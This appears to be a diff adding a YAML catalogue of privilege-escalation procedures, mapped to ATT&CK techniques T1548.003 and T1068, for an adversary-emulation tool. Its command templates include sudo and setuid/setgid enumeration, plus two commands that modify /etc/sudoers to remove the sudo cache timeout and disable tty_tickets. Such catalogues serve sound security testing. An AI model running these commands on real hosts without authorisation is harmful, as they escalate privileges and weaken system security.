@@ -1,0 +1,60 @@
+# Sudo abuse and exploitation for privilege: written for the Phase 2 catalogue (spec 2.1).
+attack_version: "20.1"
+procedures:
+  - id: sudo-list
+    technique: T1548.003
+    tactic: TA0004
+    source: atomic
+    protocol: ssh
+    template: sudo -l
+    ref: ART T1548.003 test 1 Sudo usage (150c3a08-ee6e-48a6-aeaf-3659d24ceb4e)
+  - id: sudo-nopass
+    technique: T1548.003
+    tactic: TA0004
+    source: own
+    protocol: ssh
+    template: sudo -n id
+  - id: sudo-cache-timeout
+    technique: T1548.003
+    tactic: TA0004
+    source: atomic
+    protocol: ssh
+    template: sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
+    ref: ART T1548.003 test 3 Unlimited sudo cache timeout (a7b17659-dd5e-46f7-b7d1-e6792c91d0bc)
+  - id: sudo-tty-tickets
+    technique: T1548.003
+    tactic: TA0004
+    source: own
+    protocol: ssh
+    template: grep tty_tickets /etc/sudoers
+  - id: sudo-tty-tickets-off
+    technique: T1548.003
+    tactic: TA0004
+    source: atomic
+    protocol: ssh
+    template: sudo sh -c "echo Defaults '!'tty_tickets >> /etc/sudoers"
+    ref: ART T1548.003 test 5 Disable tty_tickets for sudo caching (91a60b03-fb75-4d24-a42e-2eb8956e8de1)
+  - id: privesc-find-setuid
+    technique: T1068
+    tactic: TA0004
+    source: own
+    protocol: ssh
+    template: find {{dir}} -perm -4000 -type f 2>/dev/null
+  - id: privesc-getcap
+    technique: T1068
+    tactic: TA0004
+    source: own
+    protocol: ssh
+    template: getcap -r {{dir}} 2>/dev/null
+  - id: privesc-writable-etc
+    technique: T1068
+    tactic: TA0004
+    source: own
+    protocol: ssh
+    template: find /etc -writable -type f 2>/dev/null
+  - id: privesc-find-setgid
+    technique: T1068
+    tactic: TA0004
+    source: own
+    protocol: ssh
+    template: find {{dir}} -perm -2000 -type f 2>/dev/null
